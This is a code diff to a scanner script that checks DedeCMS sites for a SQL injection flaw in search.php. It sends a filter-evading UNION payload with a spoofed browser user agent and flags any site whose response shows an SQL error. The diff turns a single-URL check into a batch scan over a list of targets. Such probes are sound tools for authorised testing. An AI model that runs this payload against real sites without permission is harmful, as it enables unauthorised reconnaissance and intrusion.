@@ -1,11 +1,22 @@
-#request url = var
+#request urls = array
 #define payload = /plus/search.php?keyword=test&typeArr[%20uNion%20]=a
 
 function main(args)
 {
-	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],"Error sql",0)!= "-1")
-	{
-		print(url."存在dedecms search.php SQL注入漏洞");
+	printclolor("当前正在检测:"."存在dedecms search.php SQL注入漏洞",1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],"Error sql",0)!= "-1")
+			{
+				printclolor("[+]".urls[i]."存在dedecms search.php SQL注入漏洞",3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
+	
 }
